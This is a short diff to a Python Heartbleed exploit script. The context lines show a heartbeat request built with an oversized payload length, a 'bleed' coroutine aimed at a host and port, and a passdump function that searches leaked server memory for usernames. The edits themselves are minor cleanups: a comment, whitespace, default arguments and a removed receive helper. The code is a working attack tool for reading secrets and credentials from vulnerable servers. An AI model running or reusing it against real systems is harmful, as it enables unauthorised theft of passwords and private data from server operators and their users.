@@ -77,6 +77,7 @@ def build_heartbeat(tls_ver = 0x01):
 0x40, 0x00		# Payload length
 	] 
 
+# data bytes
 client_hello = hex2bin(build_client_hello())
 heartbeat = hex2bin(build_heartbeat())
 
@@ -91,31 +92,13 @@ def hexdump(s):
 		print( '  %04x: %-48s %s' % (b, hxdat, pdat))
 
 def textdump(s):
-	print(''.join(chr(c) for c in s if 32 <= c <= 126 ))
+	print(''.join(chr(c) for c in s if 32 <= c <= 126))
 
 def passdump(s):
-	buf = ''.join(chr(c) for c in s if 32 <= c <= 126 )
+	buf = ''.join(chr(c) for c in s if 32 <= c <= 126)
 	left = buf.find('username')
 	if left != -1:
 		print(buf[left:])
-
-def recvAll(s, length, timeout=5):
-	endtime = time.time() + timeout
-	rdata = b''
-	remain = length
-	while remain > 0:
-		rtime = endtime - time.time() 
-		if rtime < 0:
-			break
-
-		data = s.recv(remain)
-		# EOF?
-		if not data:
-			break
-		rdata += data
-		remain -= len(data)
-
-	return rdata
 
 @asyncio.coroutine
 def recvMessage(reader):
@@ -135,7 +118,7 @@ def recvMessage(reader):
 	return typ, ver, payload
 
 @asyncio.coroutine
-def bleed(host, port, concurrency, forever):
+def bleed(host, port = 443, concurrency = 1, forever = False):
 	global active
 	if active < concurrency:
 		active += 1
